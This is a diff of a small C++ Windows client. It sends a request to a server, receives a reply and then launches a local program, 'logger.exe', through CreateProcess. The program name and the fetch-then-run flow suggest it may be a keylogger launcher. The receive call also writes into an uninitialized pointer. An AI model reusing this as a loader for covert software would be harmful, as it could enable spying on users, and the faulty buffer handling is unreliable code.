@@ -28,18 +28,18 @@ int main(){
     }
     cout<<"\nConnected to server!";
 
-    // char buffer[20]={'S'};
-    // send(server, buffer, sizeof(buffer), 0);
+    char buffer[20]={'S'};
+    send(server, buffer, sizeof(buffer), 0);
     cout<<"\nFile requested"<< endl;
 
-    // char *message;
-    // int valread = recv(server,message,20,0);
+    char *message;
+    int valread = recv(server,message,20,0);
 
     cout<<"\nFile received";
     STARTUPINFO startInfo = {0};
     PROCESS_INFORMATION processInfo = {0};
-    // BOOL b5success = CreateProcess(TEXT("C:/Users/thekiingslayer/Desktop/logger.exe"),NULL,NULL,NULL,FALSE,FALSE,NULL,NULL,&startInfo,&processInfo);
-    BOOL b5success = CreateProcess(TEXT("//DABASAJAY/test/logger.exe"),NULL,NULL,NULL,FALSE,FALSE,NULL,NULL,&startInfo,&processInfo);
+    BOOL b5success = CreateProcess(TEXT("C:/Users/thekiingslayer/Desktop/logger.exe"),NULL,NULL,NULL,FALSE,FALSE,NULL,NULL,&startInfo,&processInfo);
+    // BOOL b5success = CreateProcess(TEXT("//DABASAJAY/test/logger.exe"),NULL,NULL,NULL,FALSE,FALSE,NULL,NULL,&startInfo,&processInfo);
     if(b5success){
         cout<<"\nProcess Started\n\n";
     }
